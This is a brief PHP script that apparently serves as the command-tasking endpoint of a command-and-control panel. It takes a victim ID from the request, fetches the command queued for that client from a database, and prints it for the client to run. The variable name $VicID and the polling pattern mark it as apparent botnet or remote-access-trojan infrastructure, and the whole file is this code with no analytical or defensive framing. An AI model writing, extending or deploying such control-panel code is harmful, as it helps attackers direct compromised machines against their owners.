<?php 
include 'classes/database.php';
include 'classes/clients.php';
if (isset($_GET['id'])) {
	$VicID = $_GET['id'];
	$client = new Clients;
	$command = $client->getCommand($VicID); 
	echo $command->Command;
}
?>